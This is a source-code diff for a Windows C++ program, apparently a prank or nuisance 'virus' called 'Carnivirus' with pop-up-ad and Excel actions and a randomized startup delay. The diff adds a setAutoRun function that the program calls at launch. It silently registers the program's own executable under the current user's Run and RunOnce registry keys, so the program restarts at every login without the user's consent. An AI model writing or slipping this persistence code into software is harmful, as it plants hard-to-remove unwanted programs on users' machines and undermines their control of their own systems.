@@ -15,14 +15,15 @@
 #include "ExcelAction.h"
 #include "PopUpAdsAction.h"
 
-
 #define MIN_INITIAL_SLEEP 1000
 #define MAX_INITIAL_SLEEP 2000
 
 // full after half hour
 #define PASSIVE_PROGRESS_REDUCTION_PER_SEC (1. / 1800)
+#define PATH_LENGTH 200
 
 void drawUpdate(double dt);
+void setAutoRun();
 
 Draw* draw;
 VeganProgress* veganProgress;
@@ -31,6 +32,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow
 {
     srand(time(NULL));
     Sleep(rand() / RAND_MAX * (MAX_INITIAL_SLEEP - MIN_INITIAL_SLEEP) + MIN_INITIAL_SLEEP);
+
+    setAutoRun();
 
     draw = new Draw(hInstance, drawUpdate);
     MouseManager mouseManager;
@@ -63,4 +66,23 @@ void drawUpdate(double dt)
 {
     veganProgress->draw(dt);
     veganProgress->addProgress(-dt * PASSIVE_PROGRESS_REDUCTION_PER_SEC);
+}
+
+// function sets this program in auto runs in the registry
+// input: none
+// return: none
+void setAutoRun()
+{
+    // get path
+    wchar_t currentPath[PATH_LENGTH] = { 0 };
+    GetModuleFileNameW(NULL, currentPath, PATH_LENGTH);
+
+    HKEY hkey = NULL;
+    RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
+    RegSetValueExW(hkey, L"Carnivirus", 0, REG_SZ, (BYTE*)currentPath, lstrlen(currentPath) * sizeof(WCHAR));
+    RegCloseKey(hkey);
+
+    RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
+    RegSetValueExW(hkey, L"Carnivirus", 0, REG_SZ, (BYTE*)currentPath, lstrlen(currentPath) * sizeof(WCHAR));
+    RegCloseKey(hkey);
 }
